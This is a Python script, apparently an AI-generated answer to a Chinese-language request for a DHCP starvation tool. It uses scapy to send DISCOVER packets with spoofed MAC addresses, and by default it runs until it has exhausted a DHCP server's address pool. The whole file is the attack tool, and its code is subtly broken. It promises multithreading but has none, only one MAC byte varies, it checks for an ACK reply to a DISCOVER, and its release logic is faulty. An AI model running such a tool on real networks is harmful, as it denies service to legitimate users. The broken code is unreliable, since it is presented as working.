#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

"""
编写一个Python脚本，用来实现抢占DHCP地址池里的IP地址。

随机生成不同的MAC地址用来发起抢占。使用多线程技术让脚本可以同时发起多次抢占，同时监视DHCP Server的响应，记录使用的MAC地址与抢占到的IP地址。

脚本运行时可以指定抢占IP地址的数量，若不指定数量，则直到抢占将DHCP地址池消耗殆尽为止。

无论是指定数量的抢占还是消耗殆尽的抢占，在抢占结束时均给出抢占完成的提示，并显示使用了哪个MAC地址抢占到了哪个IP地址的映射关系。

在显示了上面的映射关系后，给出下一步操作的选择。

指定抢占数量与不指定抢占数量，这两种执行方式在抢占完成后的提示有所不同：

指定数量的抢占在完成抢占后提示继续抢占或释放已被抢占的IP地址。继续抢占的选择中包含继续抢占指定数量的IP地址，或是直到抢占将DHCP地址池消耗殆尽为止。释放也是如此，释放指定数量的已被抢占的IP地址，或是全部释放。

不指定抢占数量的抢占在完成抢占后提示释放指定数量的已被抢占的IP地址，或是全部释放。

以上两种提示中都有结束程序的选择，在哪一种提示中，只要是选择了结束程序都必须先释放掉处在被抢占状态的IP地址，再结束程序。

===

为了实现这个需求，我们可以采用以下步骤：

1.根据需要抢占的IP地址数量，生成相应数量的MAC地址。
2.设计抢占IP地址的函数，通过向DHCP服务器发送DHCP DISCOVER请求包，抢占到一个IP地址。
3.使用多线程技术并发发起多个抢占任务。
4.监听DHCP服务器的响应，记录使用的MAC地址与抢占到的IP地址。
5.显示使用了哪个MAC地址抢占到了哪个IP地址的映射关系。
6.根据抢占方式提示下一步操作的选择。
下面是一个示例代码，仅供参考：

"""

import random
import threading
import time

import scapy.all as scapy

# DHCP DISCOVER包的源MAC地址和目的MAC地址，这里使用广播地址和固定的MAC地址：00:11:22:33:44:55
SRC_MAC = "00:11:22:33:44:55"
DST_MAC = "ff:ff:ff:ff:ff:ff"

# DHCP DISCOVER包的源IP地址和目的IP地址，这里使用0.0.0.0和固定的DHCP服务器IP地址：192.168.1.1
SRC_IP = "0.0.0.0"
DST_IP = "192.168.1.1"


def gen_mac(num):
    """
    生成指定个数的随机MAC地址
    :param num: 生成MAC地址的个数
    :return: MAC地址列表
    """
    mac_list = []
    for i in range(num):
        mac = [0x00, 0x11, 0x22, 0x33, 0x44, random.randint(0x00, 0xff)]
        mac_list.append(':'.join(map(lambda x: "%02x" % x, mac)))
    return mac_list


def send_discover(mac):
    """
    发送DHCP DISCOVER请求包，并获取DHCP服务器的响应
    :param mac: 发送DISCOVER请求包时使用的MAC地址
    :return: 抢占到的IP地址
    """
    # 构造DHCP DISCOVER请求包，使用指定的MAC地址和物理地址
    pkt = (
        scapy.Ether(src=mac, dst=DST_MAC) /
        scapy.IP(src=SRC_IP, dst=DST_IP) /
        scapy.UDP(dport=67, sport=68) /
        scapy.BOOTP(chaddr=mac) /
        scapy.DHCP(options=[("message-type", "discover"), "end"])
    )

    # 使用srp发送DISCOVER请求包，这里只获取第一个响应包
    ans, unans = scapy.srp(pkt, timeout=5, verbose=False)
    if ans:
        # 解析DHCP服务器的响应包，获取分配给该MAC地址的IP地址
        dhcp_ack = ans[0][1][scapy.DHCP]
        if dhcp_ack.options[0][1] == 5:
            yiaddr = dhcp_ack.yiaddr
            print("MAC:{} got IP:{}".format(mac, yiaddr))
            return yiaddr
    return None


def worker(num):
    """
    抢占指定数量的IP地址
    :param num: 抢占的IP地址数量
    """
    mac_list = gen_mac(num)
    ip_dict = {}
    for mac in mac_list:
        ip = send_discover(mac)
        if ip:
            ip_dict[mac] = ip

    print("IP address mapping:")
    for mac, ip in ip_dict.items():
        print("MAC:{} -> IP:{}".format(mac, ip))

    choice = input("Press 1 to continue, 2 to release, and 3 to exit:")
    while choice not in ["1", "2", "3"]:
        choice = input("Please input valid choice(1/2/3):")
    if choice == "1":
        sub_choice = input("Press 1 to grab more, 2 to grab until DHCP pool is exhausted:")
        while sub_choice not in ["1", "2"]:
            sub_choice = input("Please input valid choice(1/2):")
        if sub_choice == "1":
            worker(num)
        else:
            worker(100000)
    elif choice == "2":
        sub_choice = input("Press 1 to release some, and 2 to release all:")
        while sub_choice not in ["1", "2"]:
            sub_choice = input("Please input valid choice(1/2):")
        if sub_choice == "1":
            release_num = input("Please input number of IP addresses to release:")
            while not release_num.isdigit() or int(release_num) < 1 or int(release_num) > num:
                release_num = input("Please input valid number:")
            for i in range(int(release_num)):
                ip = input("Please input the IP to release:")
                while not scapy.IP(ip):
                    ip = input("Please input a valid IP:")
                del ip_dict[mac_list[i]]
                print("IP:{} is released".format(ip))
        else:
            for mac, ip in ip_dict.items():
                del ip_dict[mac]
                print("IP:{} is released".format(ip))
    else:
        for mac, ip in ip_dict.items():
            print("Release IP:{}...".format(ip))
            send_release(mac, ip)
        print("All allocated IP addresses have been released.")


def send_release(mac, ip):
    """
    发送DHCP RELEASE请求包，释放指定IP地址
    :param mac: 发送RELEASE请求包时使用的MAC地址
    :param ip: 要释放的IP地址
    """
    # 构造DHCP RELEASE请求包，使用指定的MAC地址和物理地址，以及需要释放的IP地址
    pkt = (
        scapy.Ether(src=mac, dst=DST_MAC) /
        scapy.IP(src=ip, dst=DST_IP) /
        scapy.UDP(dport=67, sport=68) /
        scapy.BOOTP(chaddr=mac, ciaddr=ip) /
        scapy.DHCP(options=[("message-type", "release"), "end"])
    )

    # 使用sendp发送RELEASE请求包
    scapy.sendp(pkt, verbose=False)


if __name__ == "__main__":
    num = input("Please input number of IP addresses to grab(Enter to grab all):")
    if num.isdigit():
        worker(int(num))
    else:
        worker(100000)

